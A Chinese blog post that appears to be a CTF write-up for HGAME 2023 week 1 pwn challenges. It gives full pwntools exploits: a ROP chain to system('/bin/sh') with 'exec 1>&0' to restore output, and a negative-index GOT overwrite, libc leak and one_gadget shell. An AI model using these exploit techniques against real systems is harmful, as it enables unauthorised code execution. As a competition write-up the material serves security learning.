<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>hgame_week1 • StarrySky</title><meta name="description" content="hgame_week1 - StarrySky"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="StarrySky"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="StarrySky" type="application/atom+xml">
</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="StarrySky"><img class="logo-image" src="/logo.svg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">ABOUT</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">hgame_week1</h1><div class="post-info"><a></a>2023-01-12</div><div class="post-content"><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><p><strong>知识点：</strong>标准输出(close(1))和标准错误(close(2))，有shell但获得不了输出。可以通过exec 1&gt;&amp;0来把标准输出重定向到文件描述符0(标准输入)，这个文件默认是开启的。这样我们就可以看到输出了</p>
<p>exec有两个作用</p>
<ol>
<li>代替shell执行命令，区别是shell执行完之后会回到shell，而exec会直接退出。</li>
<li>文件重定向，也就是<code>exec 1&gt;&amp;0</code>这样将文件描述符为1的文件重定向到0上</li>
</ol>
<p><strong>思路</strong>：利用backdoor来getshell之后输入exec 1&gt;&amp;0进行文件重定向</p>
<p><strong>完整exp如下</strong></p>
<pre><code class="python">from pwn import *

context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

file_name = &#39;./vuln&#39;

li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)
ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)

context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

debug = 1
if debug:
    r = remote(&#39;week-1.hgame.lwsec.cn&#39;,31793)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

ret = 0x000000000040101a
backdoor = 0x401176
bin_sh = 0x402004
system = 0x401060
rdi = 0x0000000000401233
read = 0x4011A8

p1 = b&#39;a&#39; * (0x10 + 8) + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system) + p64(read)
r.sendline(p1)
r.sendline(b&#39;exec 1&gt;&amp;0&#39;)
r.interactive()
</code></pre>
<h2 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h2><p><strong>分析：</strong></p>
<p>读入v0作为数组下标，对小于0时未做限制，因此可以利用数组向上覆盖任意地址内容或定位到任意地址来泄露地址</p>
<p>vuln函数最后exit（0）结束程序导致不能二次利用，所以第一步先将exit_got覆盖成vuln_addr使程序可以被二次利用</p>
<p>由于使用的下标是16*v0，则计算v0：（所求地址-seats地址）&#x2F;16</p>
<pre><code class="python">#将exit覆盖成vuln
index1 = (exit - seat) / 16
r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))
r.sendlineafter(&#39;please input your name\n&#39; , p64(vuln))
</code></pre>
<p>linux自带ASLR地址随机化每次程序运行时函数地址都不同， 但是由于函数与libc之间的相对距离不变，所以可以间接通过泄露函数地址求libc地址</p>
<p>为了不影响程序的正常运行，这里选择泄露位于main函数中不会再被用到的setbuf</p>
<pre><code class="python">index2 = (setbuf - seat) / 16
r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index2)))
r.sendlineafter(&#39;please input your name&#39; , &#39;&#39;)

leak_addr = u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
li(&#39;leak_addr = &#39; + hex(leak_addr))
</code></pre>
<p>用泄露的setbuf地址和相对位置计算libc地址</p>
<pre><code class="python">#leak_addr - libc = 0x8ba0a
libc_base = leak_addr - 0x8ba0a
</code></pre>
<p>接下来就是利用one_gadget来getshell了，还是选择exit位置将其覆盖成one_gadget，这样程序运行到结束就可以getshell了</p>
<p><strong>完整exp如下</strong></p>
<pre><code class="python">from pwn import *

context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

file_name = &#39;./vuln&#39;

li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)
ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)

context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

debug = 1
if debug:
    r = remote(&#39;week-1.hgame.lwsec.cn&#39;,31205)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

seat = 0x4040A0
exit = 0x404040
vuln = 0x4011D6
setbuf = 0x404020

index1 = (exit - seat) / 16
r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))
r.sendlineafter(&#39;please input your name\n&#39; , p64(vuln))

index2 = (setbuf - seat) / 16
r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index2)))
r.sendlineafter(&#39;please input your name&#39; , &#39;&#39;)

leak_addr = u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
li(&#39;leak_addr = &#39; + hex(leak_addr))

#leak_addr - libc = 0x8ba0a
libc_base = leak_addr - 0x8ba0a
                                                                                                                      

one = [0xe3afe , 0xe3b01 , 0xe3b04]
one_gadget = one[1] + libc_base

r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))
r.sendlineafter(&#39;please input your name&#39; , p64(one_gadget))

r.interactive()
</code></pre>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2></div></article></div></main><footer><div class="paginator"><a class="next" href="/2023/01/05/hello-world/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">StarrySky</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
    Barba.Pjax.start()
})</script></body></html>